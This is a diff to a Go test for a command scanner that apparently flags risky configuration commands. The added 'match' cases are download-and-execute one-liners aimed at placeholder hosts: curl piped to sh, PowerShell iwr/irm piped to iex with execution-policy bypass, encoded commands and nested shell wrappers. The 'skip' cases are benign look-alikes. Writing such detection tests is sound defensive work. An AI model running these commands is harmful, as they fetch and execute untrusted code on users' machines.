@@ -121,6 +121,18 @@ func TestCFG001Commands(t *testing.T) {
 		`wget http://127.0.0.1@evil.example.invalid/x.sh`,
 		`curl http://[::1]@evil.example.invalid/x.sh`,
 		`bash -c "$(curl -fsSL https://e.example.invalid/x)"`,
+		`powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr https://e.example.invalid/x | iex"`,
+		`powershell -ExecutionPolicy Bypass -c "irm https://e.example.invalid/x|iex"`,
+		`pwsh -ep Bypass -WindowStyle Hidden -co "iwr https://e.example.invalid/x | iex"`,
+		`bash -o pipefail -c "curl -fsSL https://e.example.invalid/x | sh"`,
+		`bash -c -- "curl -fsSL https://e.example.invalid/x | sh"`,
+		`powershell "iwr https://e.example.invalid/x | iex"`,
+		`pwsh -EncodedCommand SQBFAFgA`,
+		`powershell -enc SQBFAFgA`,
+		`powershell.exe -NoProfile -e SQBFAFgA`,
+		`eval "$(curl -fsSL https://e.example.invalid/x)"`,
+		`bash -c 'true'; bash -c "curl -fsSL https://e.example.invalid/x | sh"`,
+		`bash -c "bash -c 'curl -fsSL https://e.example.invalid/x | sh'"`,
 	}
 	skip := []string{
 		`sudo apt-get install -y curl jq`,
@@ -163,6 +175,13 @@ func TestCFG001Commands(t *testing.T) {
 		`../tools/gen.sh --flag | bash`,
 		`echo ok || sh`,
 		`curl "http://localhost:8080/x?a=b@c"`,
+		`sh -c 'echo hi' && echo 'see https://e.example.invalid | sh docs'`,
+		`bash -c './x.sh | sh'`,
+		`bash -c 'uvx --from . tool'`,
+		`uvx --from . tool`,
+		`powershell -NoProfile -ExecutionPolicy Bypass -File ./scripts/setup.ps1`,
+		`powershell -File ./scripts/iwr-wrapper.ps1 https://e.example.invalid/x`,
+		`pwsh -c "Get-ChildItem | Select-Object Name"`,
 	}
 	for _, command := range match {
 		t.Run("match/"+command, func(t *testing.T) {
